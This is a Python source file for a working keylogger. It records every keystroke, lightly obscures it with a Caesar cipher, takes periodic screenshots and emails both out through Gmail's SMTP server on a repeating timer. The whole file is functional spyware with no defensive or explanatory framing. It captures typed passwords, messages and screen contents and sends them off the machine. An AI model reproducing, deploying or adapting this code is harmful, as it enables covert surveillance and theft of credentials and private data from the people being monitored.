import smtplib
import threading
from pynput import keyboard
import pyautogui
import time
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str, shift: int, screenshot_interval: int) -> None:
        # Initialize KeyLogger parameters
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password
        self.shift = shift  # Caesar cipher shift value
        self.screenshot_interval = screenshot_interval

    def append_to_log(self, string):
        # Append keystrokes to the log
        assert isinstance(string, str)
        self.log = self.log + string

    def caesar_cipher(self, text, shift):
        # Apply Caesar Cipher encryption to text
        encrypted_text = ""
        for char in text:
            if char.isalpha():
                shifted = ord(char) + shift
                if char.islower():
                    if shifted > ord('z'):
                        shifted -= 26
                    elif shifted < ord('a'):
                        shifted += 26
                elif char.isupper():
                    if shifted > ord('Z'):
                        shifted -= 26
                    elif shifted < ord('A'):
                        shifted += 26
                encrypted_text += chr(shifted)
            else:
                encrypted_text += char
        return encrypted_text

    def capture_screenshot(self):
        # Capture a screenshot and read the image data
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_name = f"screenshot_{timestamp}.png"
        pyautogui.screenshot(screenshot_name)

        with open(screenshot_name, "rb") as file:
            screenshot_data = file.read()

        return screenshot_data, screenshot_name

    def on_press(self, key):
        # Function triggered on key press
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        encrypted_key = self.caesar_cipher(current_key, self.shift)
        self.append_to_log(encrypted_key)

        if self.screenshot_interval > 0 and len(self.log) % self.screenshot_interval == 0:
            screenshot_data, screenshot_name = self.capture_screenshot()
            self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_data, screenshot_name)
            self.log = ""

    def send_mail(self, email, password, message, attachment_data=None, attachment_name=None):
        # Send email with log and optional screenshot attachment
        subject = "Keylogger Report"
        body = f"Hello,\n\nHere is the latest keylogger report:\n\n{message}"

        if attachment_data and attachment_name:
            message = MIMEMultipart()
            message["From"] = email
            message["To"] = email
            message["Subject"] = subject

            message.attach(MIMEText(body, "plain"))

            attachment = MIMEImage(attachment_data, name=os.path.basename(attachment_name))
            message.attach(attachment)
            attachment.add_header("Content-Disposition", f"attachment; filename= {attachment_name}")

            message = message.as_string()
        else:
            message = f"Subject: {subject}\n\n{body}"

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report_n_send(self):
        # Send email with log data at regular intervals
        if len(self.log) > 0:
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""

        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self):
        # Start keylogging and email reporting
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()

    def decrypt_log(self):
        encrypted_log = self.log  # Retrieve the encrypted log
        decrypted_log = self.caesar_cipher(encrypted_log, -self.shift)  # Decrypt using the reverse shift
        return decrypted_log        
